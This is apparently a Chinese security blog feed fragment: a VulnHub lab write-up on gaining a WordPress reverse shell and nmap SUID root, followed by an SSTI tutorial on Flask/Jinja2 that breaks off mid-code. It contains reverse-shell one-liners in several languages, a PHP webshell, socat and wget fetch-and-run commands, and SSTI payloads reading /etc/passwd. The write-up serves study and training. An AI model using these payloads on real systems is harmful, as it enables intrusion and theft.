class="hljs-number">192.168.114.0</span>/<span class="hljs-number">24</span> (同个网段，内网嗅探)<br></code></pre></div></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408165133607.png" alt="image-20220408165133607" style="zoom:80%;" /><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408165230171.png" alt="image-20220408165230171" style="zoom:67%;" /><p>找到目标靶机并确认开启了80，443端口。</p><h3 id="5-目录扫描"><a href="#5-目录扫描" class="headerlink" title="5.目录扫描"></a>5.目录扫描</h3><p>访问网站，是一个虚拟终端的动画展示（无法执行命令）。除此外没有得到其他有用信息，也无链接可以跳转。</p><p>于是尝试进行目录爆破，使用工具kali下的<code>gobuster</code></p><p><code>gobuster dir -w /home/wanghao/vulnhub/Dir.txt  -u http://192.168.114.129 -t 20 -o test.txt</code></p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_1648873626300.png" alt="img" style="zoom:80%;" /><p>当然方式有很多，Kali下还有自带的<code>dirb</code> <code>dirb https://192.168.114.129/  </code></p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408170348142.png" alt="image-20220408170348142" style="zoom:67%;" /><p>访问 &#x2F;login 跳转到<strong>wordpress登录界面</strong>，抓包测试明文传输，但目前没有密码</p><p>访问 robots.txt ，发现俩文件 <code>fsocity.dic</code> 和 <code>key-1-of-3.txt</code> （就这样第1个key就拿到了，一共3个key）</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408171824092.png" alt="image-20220408171824092" style="zoom:67%;" /><h3 id="6-用户爆破"><a href="#6-用户爆破" class="headerlink" title="6.用户爆破"></a>6.用户爆破</h3><p>下载这个 <code>fsocity.dic</code> 文件，发现是个字典，结合上面wordpress登录，可以进行一波<strong>用户爆破</strong>。</p><p>PS：这里有个技巧，如果输入的用户不存在，会进行错误提示，那么可以先爆破用户名，然后利用争取的用户名爆破密码，提高跑字典的效率！</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408172302420.png" alt="image-20220408172302420" style="zoom: 67%;" /><p>具体怎么跑就不说了，丢到burp的intruder模块就完事了。用的就是上面的dic字典，这里成功跑出用户ElLiot和elliot。（其实就是电视剧男主的名字….）</p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16488815633679.png" alt="img" style="zoom:67%;" /><p>OK，接着跑密码，这里其实看过其他人写的wp，所以知道密码也在这个dic文件中，但看了看这个dic量是在太大，密码也放在文件的最后几行里，如果是真实环境，我可能已经放弃了….  最后得到账号密码：<code>Elliot ER28-0652</code></p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408172802161.png" alt="image-20220408172802161"></p><h3 id="7-反弹shell"><a href="#7-反弹shell" class="headerlink" title="7.反弹shell"></a>7.反弹shell</h3><blockquote><p>这里走了比较多的弯路，后面对linux下反弹shell进行一波总结</p></blockquote><p>利用上面的账号密码登录wordpress后台，寻找可getshell的地方。中间为了复现，把环境打崩了。。。</p><p>后面的复现中靶机的IP变更为 <code>192.168.114.130</code></p><h4 id="修改主题文件"><a href="#修改主题文件" class="headerlink" title="修改主题文件"></a>修改主题文件</h4><p>通过修改主题文件，实现getshell。需要注意的是，要明确主题文件的<strong>相对路径</strong>，这里插入了一个echo语句，进行测试，实际上404文件在这：<code>https://192.168.114.130/wp-content/themes/twentyfifteen/404.php</code>，也即<code>路径/wp-content/themes/主题名称/主题文件</code></p><blockquote><p>后台getshell方式：<a href="https://blog.csdn.net/weixin_54430466/article/details/115298349">wordpress后台getshell</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220408183435079.png" alt="image-20220408183435079"></p><p>对于本次环境，利用方式有很多：</p><h4 id="借助webshell"><a href="#借助webshell" class="headerlink" title="借助webshell"></a>借助webshell</h4><blockquote><ol><li><p>插入一句话webshell，然后用<strong>蚁剑</strong>或<strong>哥斯拉</strong>连接后得到一个简易的终端</p></li><li><p>然后检测目标服务器的语言环境和安装的程序，再选择对应的反弹shell的payload</p><ol><li>语言环境：php、python、perl、ruby、java</li><li>应用：nc、socat、bash、zsh、openssl</li></ol></li></ol><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## php反弹shell</span><br>php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;攻击者ip&quot;,端口);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><br><span class="hljs-comment">## python反弹shell</span><br>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.114.128&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><br><span class="hljs-comment">## bash反弹shell </span><br>bash -i &gt;&amp; /dev/tcp/攻击ip/攻击端口 0&gt;&amp;1<br><br><span class="hljs-comment">## perl反弹shell</span><br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;攻击者ip&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><br><span class="hljs-comment">## java反弹shell</span><br><span class="hljs-comment">## 需要编译再运行</span><br>r = Runtime.getRuntime()<br>p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/攻击者ip/端口;cat &lt;&amp;5 | while read line; do <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])<br>p.waitFor()<br><br><span class="hljs-comment">## msfvenom生成各类shell</span><br>msfvenom -l payload |grep <span class="hljs-string">&quot;cmd/unix&quot;</span><br>msfvenom -p <span class="hljs-string">&quot;对应的payload&quot;</span> -LHOST xxx -LPORT xxx R<br></code></pre></div></td></tr></table></figure></blockquote><h4 id="直接反弹"><a href="#直接反弹" class="headerlink" title="直接反弹"></a>直接反弹</h4><blockquote><p>直接编辑主题的php文件，然后插入shell反弹语句 (fsockopen函数)</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># php 反弹</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$port</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><span class="hljs-variable">$fp</span>=@<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$errno</span>,<span class="hljs-variable">$errstr</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;\n++++++++++connect success++++++++\n&quot;</span>);<br><span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;[php-shell]:&quot;</span>);<span class="hljs-comment">//输出</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$message</span>=`<span class="hljs-variable">$shell</span>`;<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$message</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>由于oscp是kali环境的，所以payload最好也在kali里找，这里可以用wordpress的这个：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">find / -name php-reverse-shell.php<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411175756889.png" alt="image-20220411175756889"></p></blockquote><blockquote><p>相关链接：</p><p><a href="https://www.cnblogs.com/0day-li/p/13595210.html">Linux 反弹shell</a></p><p><a href="https://www.sohu.com/a/401137476_783648">不一样的 “反弹Shell” 系统剖析 </a></p></blockquote><h4 id="提升交互式shell"><a href="#提升交互式shell" class="headerlink" title="提升交互式shell"></a>提升交互式shell</h4><p>但这里有个问题，kali监听得到的本地shell，交互性较差，具体表现在：</p><ol><li>没有错误输出</li><li><strong>无法执行su、ssh等命令</strong></li><li>没有向上的历史箭头</li><li>无法使用vim等</li><li>ctrl+z 断开shell连接</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411175239671.png" alt="image-20220411175239671"></p><p>以上最要命的是无法执行su切换用户，因为后面的任务需要提权到robot用户、root用户，所以必须要搞个交互式的shell。</p><p>目前学习到的主要两个：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## python TTY交互式shell</span><br><span class="hljs-comment">## 对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端</span><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment">## socat 全交互式shell（自动补全、历史箭头、su、vim、ctrl+z返回终端）</span><br><span class="hljs-comment">### https://github.com/andrew-d/static-binaries/tree/master/socat/build.sh</span><br><span class="hljs-comment">## 靶机命令</span><br>socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口<br><span class="hljs-comment">## 攻击机命令</span><br>socat file:`<span class="hljs-built_in">tty</span>`,raw,<span class="hljs-built_in">echo</span>=0 tcp-listen:攻击机端口<br><span class="hljs-comment">### wget 一行命令socat</span><br>wget -q https://xxx.com/socat -O /tmp/socat; <span class="hljs-built_in">chmod</span> +x /tmp/socat; /tmp/socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080<br></code></pre></div></td></tr></table></figure><p><strong>tips</strong>：一般linux并没有安装socat，可以先下载到vps上，然后在靶机上通过wget的方式下载再本地运行</p><blockquote><p>相关链接：<a href="https://blog.csdn.net/weixin_30522983/article/details/116941725">Linux完全交互式的TTY</a></p></blockquote><h3 id="8-提权"><a href="#8-提权" class="headerlink" title="8.提权"></a>8.提权</h3><h4 id="8-1-su切换"><a href="#8-1-su切换" class="headerlink" title="8.1 su切换"></a>8.1 su切换</h4><p>完成交互式shell建立后，先进入<code>/home/robot</code> 查看，发现第二个key和一个md5加密的密码</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411160309193.png" alt="image-20220411160309193"></p><p>对密码进行破解，得到用户<code>robot/abcdefghijklmnopqrstuvwxyz</code>，至于为什么是robot用户？除了home下用户名外，也可以看看<code>etc/passwd</code>文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411160512807.png" alt="image-20220411160512807"></p><p>于是切换到robot用户。还记得之前的key-2吗，用daemon权限是读取不到的，只有owner，也即robot用户才有权读取。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411161341570.png" alt="image-20220411161341570"></p><h4 id="8-2-suid提权"><a href="#8-2-suid提权" class="headerlink" title="8.2 suid提权"></a>8.2 suid提权</h4><p>这里用到了suid提权，这个之前总结过，后面把那篇也更新到博客里。</p><p>简单来说，Linux中已知可用来提权的可执行文件有：</p><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">Nmap、Vim、<span class="hljs-built_in">find</span><br>Bash、<span class="hljs-built_in">More</span>、Less<br>Nano、cp<br></code></pre></div></td></tr></table></figure><p>以下命令用于发现系统上运行的SUID可执行文件。命令将尝试<strong>查找具有root权限的SUID的文件</strong>。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">find / -user root -perm -4000 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \;<br><br><span class="hljs-comment">##解释一下find 命令的参数：</span><br>1.-perm (permission)，匹配权限。<br>4000 2000 1000分别表示SUID SGID SBIT<br>2为标准错误 /dev/null为黑洞设备（收到的信息全部丢弃）<br>3.-<span class="hljs-built_in">exec</span> <span class="hljs-built_in">command</span> &#123;&#125; \;  对find匹配到的文件执行<span class="hljs-built_in">command</span>命令<br>&#123;&#125;表示由find找到的内容，都会被放到&#123;&#125;中<br>即执行<span class="hljs-built_in">ls</span> -ldb命令<br></code></pre></div></td></tr></table></figure><p>用上述命令搜索，发现存在nmap程序，且属主为root，具有s标志位。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16494044146487.png" alt="img"></p><blockquote><p>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p></blockquote><p>那么我们查看下nmap版本，确实在范围内，那直接利用了呀</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16494050907059.png" alt="img"></p><p>切到root目录，第三个key得到，打完收工</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/image-20220411164117028.png" alt="image-20220411164117028"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>vulnhub靶场练习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场练习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2022/03/26/SSTI/"/>
    <url>/2022/03/26/SSTI/</url>
    
    <content type="html"><![CDATA[<h2 id="SSTI初识"><a href="#SSTI初识" class="headerlink" title="SSTI初识"></a>SSTI初识</h2><h3 id="从何而来？"><a href="#从何而来？" class="headerlink" title="从何而来？"></a>从何而来？</h3><blockquote><p>MVC模型与网站模板引擎</p></blockquote><p>讲SSTI之前，首先需要了解MVC模型。MVC是一种开发框架，全名是Model View Controller。</p><p>也即模型(model)－视图(view)－控制器(controller)</p><p>在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给 View ，这样就最终显示在我们的面前了，那么这里的 View 就会大量地运用一种叫<strong>网站模板引擎的技术</strong>。</p><p>通俗的讲，整个过程就是拿到数据处理，塞到模板里，然后让渲染引擎将塞进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p><p>常见的模板引擎：</p><ul><li><strong>php</strong>：Smarty、Twig、Blade</li><li><strong>java</strong>：jsp、Velocity</li><li><strong>python</strong>：flask&#x2F;jinjia2、django(ORM)、tornado</li><li><strong>ruby</strong>：erb</li></ul><p>再回到SSTI，SSTI全称服务端模板注入，起因是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中（渲染函数），执行了用户插入的恶意内容，从而导致各种各样的问题。—— 与sql注入类似，相信用户的输入并做了执行。</p><h2 id="SSTI前置知识"><a href="#SSTI前置知识" class="headerlink" title="SSTI前置知识"></a>SSTI前置知识</h2><h3 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h3><blockquote><p>启动 python 解释器时，即使没有创建任何变量或函数还是会有很多函数可供使用，这些就是 python 的内建函数</p><p>在 Python 交互模式下，使用命令 <code>dir(&#39;builtins&#39;)</code> 即可查看当前 Python 版本的一些内建变量、内建函数，内建函数可以调用一切函数</p></blockquote><h3 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h3><blockquote><ul><li>构造 Python-SSTI 的 Payload 需要什么是类继承</li><li>Python 中一切均为对象，均继承于 object 对象，Python 的 object 类中集成了很多的基础函数，假如需要在 Payload 中使用某个函数就需要用 object 去操作</li></ul></blockquote><blockquote><ul><li>常见的继承关系的方法有以下三种:</li></ul><ol><li><strong>base</strong>：对象的一个基类，一般情况下是 object</li><li><strong>mro</strong>：获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object 在最底层所以在列表中的最后，通过 <strong>mro</strong>[-1] 可以获取到</li><li><strong>subclasses</strong>()：继承此对象的子类，返回一个列表</li></ol></blockquote><h3 id="攻击链寻找"><a href="#攻击链寻找" class="headerlink" title="攻击链寻找"></a>攻击链寻找</h3><blockquote><p>攻击方式为：变量 -&gt; 对象 -&gt; 基类 -&gt; 子类遍历 -&gt; 全局变量</p></blockquote><p>基础类的执行</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">__class__  返回类型所属的对象（类）<br>__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br>__base__   返回该对象所继承的基类<br>// __base__和__mro__都是用来寻找基类的<br>__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>__init__  类的初始化方法<br>__globals__  对包含函数全局变量的字典的引用<br><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&#123;&#125;.__class__.__bases__[<span class="hljs-number">0</span>]<br>().__class__.__bases__[<span class="hljs-number">0</span>]<br>[].__class__.__bases__[<span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure><p>此外，在引入了 Flask&#x2F;Jinja 的相关模块后还可以通过以下字符来获取基本类</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">config<br>request<br>url_for<br>get_flashed_messages<br>self<br>redirect<br></code></pre></div></td></tr></table></figure><p>获取基本类后，继续向下获取基本类 (object) 的子类</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()<br></code></pre></div></td></tr></table></figure><p>写一个遍历子类</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> html<br>url = <span class="hljs-string">&quot;http://161.35.47.235:31391/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D&quot;</span><br>result = html.unescape(requests.get(url).text)<br>type_list = re.findall(<span class="hljs-string">r&quot;&lt;type &#x27;.*?&#x27;&gt;|&lt;class &#x27;.*?&#x27;&gt;&quot;</span>, result)<br><span class="hljs-built_in">print</span>(type_list)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(type_list)):<br>    <span class="hljs-built_in">print</span>(i, type_list[i])<br></code></pre></div></td></tr></table></figure><p>找到重载过的 <code>__init__</code> 类，在获取初始化属性后，带 <code>wrapper</code> 的说明没有重载。这些并不是function，不具有<code>__globals__</code>属性。</p><p>再换几个子类，很快就能找到一个重载过__init__的类；也可以利用 <code>.index()</code>去找 <code>file</code>, <code>warnings.catch_warnings</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">99</span>].__init__<br>&lt;slot wrapper <span class="hljs-string">&#x27;__init__&#x27;</span> of <span class="hljs-string">&#x27;object&#x27;</span> objects&gt;<br><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__<br>&lt;unbound method WarningMessage.__init__&gt;<br></code></pre></div></td></tr></table></figure><p>查看其引用 <code>__builtins__</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br></code></pre></div></td></tr></table></figure><p>这里会返回 dict 类型，寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()<br></code></pre></div></td></tr></table></figure><p>常见的<strong>目标函数</strong>：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">file<br>subprocess.Popen<br>os.popen<br><span class="hljs-built_in">exec</span><br><span class="hljs-built_in">eval</span><br></code></pre></div></td></tr></table></figure><h3 id="Flask-demo"><a href="#Flask-demo" class="headerlink" title="Flask demo"></a>Flask demo</h3><p>这里以为flask 的ssti demo为例，进行学习</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/test&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="hljs-string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><br><span class="hljs-string">            &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="hljs-string">        &lt;/div&gt; </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span> %(request.url)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></div></td></tr></table></figure><p>jinjia的语言格式：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">控制结构 &#123;% %&#125;<br>变量取值 &#123;&#123; &#125;&#125;<br>注释 &#123;<span class="hljs-comment"># #&#125;</span><br></code></pre></div></td></tr></table></figure><p>参考：<a href="https://www.136.la/jingpin/show-40163.html">flask之ssti模版注入从零到入门</a></p><h2 id="HTB-template练习"><a href="#HTB-template练习" class="headerlink" title="HTB-template练习"></a>HTB-template练习</h2><p>Hack the box提供了SSTI注入的web CTF题，访问后发现页面存在flask&#x2F;jinjia2的提示，联想到ssti，进行测试</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301530344.png" alt="image-20220330153012307"></p><p>发现后端确实存在请求输入语句的解析和执行</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301529907.png" alt="image-20220330152953856"></p><p>于是利用python类继承特性，寻找可利用载荷</p><h3 id="寻找基类及可利用子类"><a href="#寻找基类及可利用子类" class="headerlink" title="寻找基类及可利用子类"></a>寻找基类及可利用子类</h3><p>首先查找object基类，并遍历其子类，寻找可使用的模块<code>warnings.catch_warnings</code>,为了方便获得子类序号，编写脚本如下，顺利找到编号185（当然，也可以利用类<code>413 &lt;class &#39;subprocess.Popen&#39;&gt;</code>）。</p><p><img src="https://cdn.jsdelivr.net/gh/Little-pepper/images/202203301625342.png" alt="image-20220330162531183"></p><p>实际上也并非必须<code>warnings.catch_warnings</code>，可利用以下方式来寻找其他可利用的类，核心是找可以重载的函数，从而获取globals全局变量</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs 